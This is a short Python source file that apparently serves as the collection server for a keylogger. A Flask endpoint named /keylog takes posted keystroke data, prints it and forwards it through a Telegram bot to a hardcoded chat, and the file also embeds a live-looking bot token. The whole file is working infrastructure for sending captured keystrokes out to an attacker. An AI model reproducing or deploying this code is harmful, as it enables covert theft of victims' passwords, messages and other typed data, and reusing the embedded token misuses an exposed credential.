from flask import Flask, request
from aiogram import Bot, Dispatcher
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties
from aiogram.fsm.storage.memory import MemoryStorage
import threading
import asyncio

TOKEN = "6904720328:AAHdFOlcIoO1r_AaF9JtU0bONBs0Yn3NiZM"
CHAT_ID = 1497603032

app = Flask(__name__)


aiogram_loop = asyncio.new_event_loop()

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())

@app.route('/keylog', methods=['POST'])
def keylog():
    data = request.data.decode('utf-8')
    print(f"Полученная строка: {data}")

    asyncio.run_coroutine_threadsafe(
        bot.send_message(chat_id=CHAT_ID, text=data), aiogram_loop
    )
    return 'OK'

def run_flask():
    app.run(host='0.0.0.0', port=5000)

async def main():

    await dp.start_polling(bot)

if __name__ == '__main__':

    flask_thread = threading.Thread(target=run_flask)
    flask_thread.start()

    asyncio.set_event_loop(aiogram_loop)
    aiogram_loop.run_until_complete(main())
